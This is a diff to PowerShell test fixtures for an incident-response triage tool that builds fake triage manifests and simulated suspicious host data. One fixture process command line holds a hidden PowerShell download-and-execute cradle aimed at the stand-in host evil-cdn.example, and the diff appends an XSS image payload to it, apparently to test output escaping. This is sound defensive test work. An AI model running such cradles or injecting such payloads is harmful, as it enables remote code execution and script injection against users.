@@ -6,7 +6,8 @@ function New-FakeTriage {
         [Parameter(Mandatory)][hashtable]$Data,
         [string]$ComputerName = 'TESTHOST',
         [switch]$Zip,
-        [bool]$Elevated = $true
+        [bool]$Elevated = $true,
+        [switch]$NoHostIp
     )
     $enc = New-Object System.Text.UTF8Encoding($false)
     [void](New-Item -ItemType Directory -Path $Path -Force)
@@ -24,10 +25,11 @@ function New-FakeTriage {
         tool = [ordered]@{ name = 'IRTriage'; version = 'test'; build = 'test'; scriptSha256 = $null }
         case = [ordered]@{ caseId = 'TEST-CASE'; analyst = 'tester'; executedAs = 'NT AUTHORITY\SYSTEM'; elevated = $Elevated }
         host = [ordered]@{ computerName = $ComputerName; domain = 'corp.example'; osCaption = 'Windows'; osVersion = '10.0'; osBuild = '22631' }
-        run = [ordered]@{ profile = 'quick'; startUtc = '2026-01-01T00:00:00Z'; endUtc = '2026-01-01T00:00:30Z'; durationSeconds = 30 }
-        collectors = $collectors
-        files = $files
     }
+    if (-not $NoHostIp) { $manifest.host.primaryIPv4 = '10.0.0.5'; $manifest.host.ipAddresses = @('10.0.0.5', 'fd00::5') }
+    $manifest.run = [ordered]@{ profile = 'quick'; startUtc = '2026-01-01T00:00:00Z'; endUtc = '2026-01-01T00:00:30Z'; durationSeconds = 30 }
+    $manifest.collectors = $collectors
+    $manifest.files = $files
     [System.IO.File]::WriteAllText((Join-Path $Path 'manifest.json'), (ConvertTo-Json -InputObject $manifest -Depth 8), $enc)
     if ($Zip) {
         $zipPath = "$Path.zip"
@@ -76,7 +78,7 @@ function Get-SuspectData {
     $d.processes = @($d.processes) + [pscustomobject]@{
         ProcessId = 4242; ParentProcessId = 3000; ParentName = 'winword.exe'; Name = 'powershell.exe'
         ExecutablePath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
-        CommandLine = 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://evil-cdn.example/a.ps1'')"'
+        CommandLine = 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://evil-cdn.example/a.ps1'')" <img src=x onerror=alert(1)>'
         Owner = 'CORP\jdoe'; Sha256 = ('AB' * 32); UserWritable = $false
     }
     $d.dns_cache = @([pscustomobject]@{ Entry = 'cdn1.evil-cdn.example'; RecordName = 'cdn1.evil-cdn.example'; Type = 'A'; Data = '203.0.113.50' })
